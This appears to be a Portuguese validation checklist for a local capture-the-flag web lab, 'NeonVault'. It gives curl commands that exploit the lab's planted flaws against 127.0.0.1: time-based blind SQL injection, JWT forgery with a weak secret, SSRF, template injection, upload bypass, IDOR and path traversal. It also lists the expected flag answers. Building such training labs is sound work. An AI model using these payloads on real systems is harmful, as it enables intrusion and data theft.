# Validation — Lab 2 NeonVault

## Escopo

Validar apenas `lab-02-neonvault`.

Nao alterar:

- `lab-01-minibank`
- arquivos historicos do Lab 1
- README raiz
- VALIDATION raiz

## Subir aplicacao

Com Node.js:

```bash
cd ~/ctf-labs/lab-02-neonvault
npm install
npm start
```

Com Docker:

```bash
cd ~/ctf-labs/lab-02-neonvault
docker compose up --build
```

## Rotas basicas

```bash
curl -i http://127.0.0.1:8092/
curl -i http://127.0.0.1:8092/login
curl -i http://127.0.0.1:8092/recover
curl -i http://127.0.0.1:8092/download
```

Login:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"
```

Rotas autenticadas:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/dashboard
curl -i -b cookies.txt http://127.0.0.1:8092/profile
curl -i -b cookies.txt http://127.0.0.1:8092/logs
curl -i -b cookies.txt http://127.0.0.1:8092/files
curl -i -b cookies.txt http://127.0.0.1:8092/messages/preview
curl -i -b cookies.txt http://127.0.0.1:8092/avatar
curl -i -b cookies.txt http://127.0.0.1:8092/tools/webhook
```

## Vulnerabilidades

Blind SQLi com atraso:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)-- "
curl -i -X POST http://127.0.0.1:8092/recover -d "username=admin" -d "recovery_code=N3ON"
```

JWT forgery:

```bash
TOKEN=$(node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
```

SSRF:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/status"
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/flag"
```

SSTI:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview -d "template={{7*7}}"
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview -d "template={{vault.sstiSecret}}"
```

Upload bypass:

```bash
printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/badge.html;filename=badge.html"
```

Logs SQLi:

```bash
curl -i -b cookies.txt -G http://127.0.0.1:8092/logs \
  --data-urlencode "level=error' OR '1'='1'-- "
```

API IDOR:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/101
curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/777
```

Path Traversal:

```bash
curl -i "http://127.0.0.1:8092/download?file=report.pdf"
curl -i "http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log"
curl -i "http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak"
```

## Flags esperadas

```bash
grep -Rho "FLAG[{][^}]*}" . | sort -u
```

Resultado esperado:

```text
FLAG{api_idor_object_leak}
FLAG{blind_sqli_extracted_admin}
FLAG{jwt_forged_neon_admin}
FLAG{logs_filter_sqli}
FLAG{ssrf_internal_neon_service}
FLAG{ssti_template_breach}
FLAG{traversal_follow_the_logs}
FLAG{upload_filter_bypass}
```

## Garantir que o Lab 1 nao foi alterado

No repositorio raiz:

```bash
cd ~/ctf-labs
git status --short
git diff --name-only -- lab-01-minibank
```

O segundo comando nao deve listar arquivos.
